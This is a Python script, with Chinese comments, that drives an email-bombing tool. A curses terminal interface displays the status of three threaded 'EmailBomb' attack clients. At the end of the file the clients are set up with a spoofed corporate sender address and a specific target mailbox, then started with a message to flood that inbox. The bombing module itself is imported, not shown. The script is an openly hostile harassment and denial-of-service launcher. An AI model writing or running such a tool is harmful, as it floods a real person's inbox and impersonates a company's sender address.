# -*- coding: utf-8 -*-

import EmailBomb
import threading
import curses
import time


class Screen:
    UP = -1
    DOWN = 1

    LEFT = -1
    RIGHT = 1

    COLORS = {
        "red": 1,
        "yellow": 2,
        "cyan": 3,
        "green": 4,
        "white": 5,
        "gray": 6,
    }

    def __init__(self):
        self.init_curses()

        self.top = 0
        self.bottom = len(CLIENTS)
        self.max_lines = curses.LINES

        self.hori_len = 0

        self.run()

    def init_curses(self):
        """Setup the curses"""
        self.window = curses.initscr()
        self.height, self.width = self.window.getmaxyx()
        self.window.keypad(True)
        self.window.nodelay(True)

        curses.noecho()
        curses.cbreak()

    def put_color(self, color, bold=False):
        bold = [bold, curses.A_BOLD][bold]

        if color == "white":
            return -1

        return curses.color_pair(1) | curses.A_RIGHT

    def input_stream(self):
        """Waiting an input and run a proper method according to type of input"""
        while 1:
            self.display()

            ch = self.window.getch()

            if ch == curses.KEY_UP:
                self.scroll(self.UP)

            elif ch == curses.KEY_DOWN:
                self.scroll(self.DOWN)

            elif ch == curses.KEY_LEFT:
                self.scroll(self.LEFT, horizontal=True)

            elif ch == curses.KEY_RIGHT:
                self.scroll(self.RIGHT, horizontal=True)

            elif ch == ord("q"):
                break

    def display(self):
        """Display the CLIENTS on window"""
        self.window.erase()

        for idx, item in enumerate(CLIENTS[self.top:self.top + self.max_lines]):
            data = item.status

            tmp_height, tmp_width = self.window.getmaxyx()
            '''
            self.width > len(data) > tmp_width: self.width √
            self.width > tmp_width > len(data): self.width

            tmp_width > self.width > len(data): tmp_width
            tmp_width > len(data) > self.width: tmp_width √

            len(data) > tmp_width > self.width: len(data)
            len(data) > self.width > tmp_width: len(data) √

            这样是不行的，别问我为啥 :D
            maxwidth = max(self.width, tmp_width, len(data))
            if maxwidth != self.width or 1:
                self.width = maxwidth
                self.window.resize(self.height, self.width)
            '''

            # 字符串长度超出默认 win 的长度，需要 resize
            if self.width < len(data):
                self.width = len(data)
                self.window.resize(self.height, self.width)
                time.sleep(1)

            # 终端宽度被调整，需要 resize
            if tmp_width != self.width:
                self.width = max(self.width, tmp_width)
                self.window.resize(self.height, self.width)
                time.sleep(1)

            # 终端高度被调整，需要 resize
            if tmp_height != self.height:
                self.max_lines = min(self.height, tmp_height)
                self.height = max(self.height, tmp_height)
                self.window.resize(self.height, self.width)
                self.top = 0
                time.sleep(1)

            try:
                self.window.addstr(idx, 0, data[self.hori_len:])
            except Exception as e:
                with open("./log", "a") as fp:
                    fp.write(data[self.hori_len:])
                raise

        self.window.refresh()

    def scroll(self, direction, horizontal=False):
        '''
        垂直滚动与水平滚动
        '''

        if horizontal:  # 水平滚动
            if (
                # self.hori_len > 0：如果已经到最左边，就不滚动了
                direction == self.LEFT and self.hori_len > 0
            ) or (
                # 右边不限制
                direction == self.RIGHT
            ):
                self.hori_len += direction

        else:  # 垂直滚动
            if (
                direction == self.UP and self.top > 0
            ) or (
                direction == self.DOWN and self.top + self.max_lines < self.bottom
            ):
                self.top += direction

    def run(self):
        """Continue running the TUI until get interrupted"""
        global EXIT_FLAG

        try:
            self.input_stream()
        except KeyboardInterrupt:
            pass

        # 兼容 iTerm2
        # os.system("printf '\e]50;ClearScrollback\a'")
        # 兼容个屁 :D
        curses.endwin()

        # screen 的线程结束的时候
        # 通知 process_data 结束
        EXIT_FLAG = 0

# ---------- 全局变量 -----------


THREADS_NUM = 3
EXIT_FLAG = 1


CLIENTS = [
    EmailBomb.EmailBomb(
        id=id,
        from_addr="hr@361.com",
        to_addr="15619047890@163.com",
    ) for id in range(THREADS_NUM)
]  # 创建攻击 client
# ------------------------------

for client in CLIENTS:
    thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
    thread.setDaemon(True)
    thread.start()  # 启动攻击 client


Screen()  # 对接 CLI 展示数据
